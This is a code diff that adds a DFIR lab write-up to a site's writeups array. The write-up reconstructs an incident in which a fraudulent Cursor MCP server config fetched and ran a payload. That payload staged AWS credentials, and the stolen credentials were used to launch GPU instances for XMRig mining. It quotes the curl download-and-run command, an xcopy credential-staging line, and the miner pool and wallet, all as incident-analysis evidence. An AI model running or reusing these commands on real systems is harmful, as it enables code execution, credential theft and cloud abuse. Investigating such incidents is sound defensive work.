@@ -244,4 +244,46 @@ window.WRITEUPS = [
             ]},
         ],
     },
+    {
+        id: 2,
+        title: 'CursorJack — Malicious MCP Integration to AWS Cryptomining',
+        category: 'Cloud / DFIR',
+        difficulty: 'Hard',
+        date: 'Jul 2026',
+        summary: 'High-confidence reconstruction of a fraudulent Cursor MCP server leading to endpoint execution, AWS admin credential theft, 16 GPU instances, and XMRig cryptomining.',
+        content: [
+            { type: 'h2', text: 'Executive Summary' },
+            { type: 'p', text: 'A backend developer searching for a Cursor Model Context Protocol (MCP) integration visited the fraudulent site awesomeawsmcp.com and installed an MCP server named “AWS dev ops.” Its configuration invoked cmd.exe to download and execute s.exe from 3.72.63.40. The payload established command-and-control, staged the workstation’s AWS credential directory, and enabled theft of the privileged admin IAM user in account 990227772331.' },
+            { type: 'p', text: 'The actor then launched 16 p3.2xlarge EC2 instances across four AWS regions and deployed an XMRig RandomX miner through unMineable. The configured Solana payout wallet was publicly labeled “Drift Exploiter 1” and received 45,292.208963921 dSOL from Drift Vault.' },
+            { type: 'table', headers: ['Field', 'Value'], rows: [
+                ['Incident / Lab', 'CursorJack'], ['Incident date', '20–21 April 2026 (UTC)'], ['Severity', 'Critical'], ['Confidence', 'High'], ['Affected platforms', 'Windows, Cursor IDE, AWS, Solana'], ['Analyst', 'Johann Weingertner'], ['Classification', 'Confidential — Training / Lab Investigation']
+            ]},
+            { type: 'h2', text: 'Attack Timeline' },
+            { type: 'table', headers: ['UTC time', 'Finding'], rows: [
+                ['2026-04-20 20:57', 'Victim visited http://awesomeawsmcp.com/.'], ['Shortly after', 'Cursor MCP server “AWS dev ops” installed with embedded curl command.'], ['20:58:11', 'curl.exe downloaded s.exe from 3.72.63.40.'], ['20:58:42', 'Payload executed; first observed C2 command was pwd.'], ['21:03:07', 'C:\\Users\\Administrator\\.aws copied to hidden .exfil staging directory.'], ['2026-04-21 10:15 onward', 'Stolen admin credentials used from 3.72.63.40.'], ['10:15–11:00+', '16 p3.2xlarge instances launched across four regions.'], ['Post-launch', 'XMRig configured for rx.unmineable.com:3333 and attacker Solana wallet.']
+            ]},
+            { type: 'h2', text: 'Initial Access & Execution' },
+            { type: 'p', text: 'Chromium history recorded a single typed visit to awesomeawsmcp.com titled “AWS dev ops.” The raw Chromium timestamp 13421192228031344 converts to 2026-04-20 20:57:08.031344Z. Cursor’s mcp.json defined the server as cmd.exe /c with a download-and-run chain targeting http://3.72.63.40:80/payload/s.exe.' },
+            { type: 'code', text: 'curl -s http://3.72.63.40:80/payload/s.exe -o C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\s.exe' },
+            { type: 'table', headers: ['Evidence', 'Observed value'], rows: [
+                ['Download technique', 'T1105 — Ingress Tool Transfer'], ['First C2 command', 'C:\\Windows\\system32\\cmd.exe /C pwd'], ['Payload path', 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\s.exe'], ['Credential staging', 'xcopy C:\\Users\\Administrator\\.aws\\* C:\\Users\\Administrator\\.exfil\\ /E /I /H']
+            ]},
+            { type: 'h2', text: 'AWS Credential Theft & Cloud Abuse' },
+            { type: 'p', text: 'CloudTrail filtering on sourceIPAddress=3.72.63.40 returned 25 events attributed to arn:aws:iam::990227772331:user/admin. RunInstances filtering identified 16 launches: four each in ap-southeast-1, us-east-1, eu-west-1, and us-west-2. Every request used the expensive p3.2xlarge GPU family and the plausible production tag Name=prod-web-server; monitoring was disabled.' },
+            { type: 'table', headers: ['CloudTrail attribute', 'Observed value'], rows: [
+                ['Source IP', '3.72.63.40'], ['IAM identity', 'arn:aws:iam::990227772331:user/admin'], ['User agent', 'InfrastructureAutomation/3.0.1 go1.22.5 (cloud-ops-deployment) linux/amd64'], ['Unauthorized resources', '16 p3.2xlarge instances across 4 regions']
+            ]},
+            { type: 'h2', text: 'Cryptomining Payload' },
+            { type: 'p', text: 'The recovered mining.sh script downloaded XMRig 6.26.0, extracted it under /tmp, and launched it with nohup. It used RandomX, capped CPU at 50%, suppressed console output, and wrote to /tmp/.sys_monitor.log.' },
+            { type: 'code', text: 'Pool: rx.unmineable.com:3333\nWallet: SOL:HkGz4KmoZ7Zmk7HN6ndJ31UJ1qZ2qgwQxgVqQwovpZES\nWorker: ip-<hostname-derived>' },
+            { type: 'h2', text: 'Blockchain Attribution & Limitations' },
+            { type: 'p', text: 'Solscan labeled the payout wallet “Drift Exploiter 1” and showed an incoming transfer of 45,292.208963921 dSOL from Drift Vault, with a displayed historical value of $4,466,805.96. The exact wallet match provides strong infrastructure-level correlation, but public blockchain labels and search results are corroborating intelligence rather than sole proof of identity.' },
+            { type: 'h2', text: 'Root Cause' },
+            { type: 'ul', items: ['Untrusted MCP integration installed without publisher or repository validation', 'Cursor allowed arbitrary shell execution from MCP configuration', 'Long-lived AWS credentials stored locally on the developer workstation', 'Admin IAM permissions allowed expensive multi-region GPU deployment', 'No SCP, quota, budget alarm, or regional restriction stopped the abuse'] },
+            { type: 'h2', text: 'Containment & Hardening' },
+            { type: 'ul', items: ['Preserve and isolate the workstation before removing the MCP configuration or payload', 'Disable the compromised admin user, revoke keys and sessions, and rotate all accessible secrets', 'Terminate unauthorized EC2 resources and inspect related cloud artifacts in every region', 'Block awesomeawsmcp.com, 3.72.63.40, the payload URL, and rx.unmineable.com:3333', 'Allow-list MCP servers; detect IDE-to-shell-to-temporary-binary execution chains', 'Use short-lived MFA-protected AWS roles, SCPs, region and instance-family restrictions, budgets, and anomaly alerts'] },
+            { type: 'h2', text: 'Conclusion' },
+            { type: 'p', text: 'The supplied endpoint, Cursor, CloudTrail, mining-script, and blockchain artifacts support a high-confidence conclusion that a fraudulent MCP integration enabled endpoint code execution, privileged AWS credential theft, unauthorized GPU deployment, and cryptomining. The report is based on supplied lab artifacts; time-sensitive public labels and token values should be preserved with timestamps outside a training context.' }
+        ]
+    },
 ];
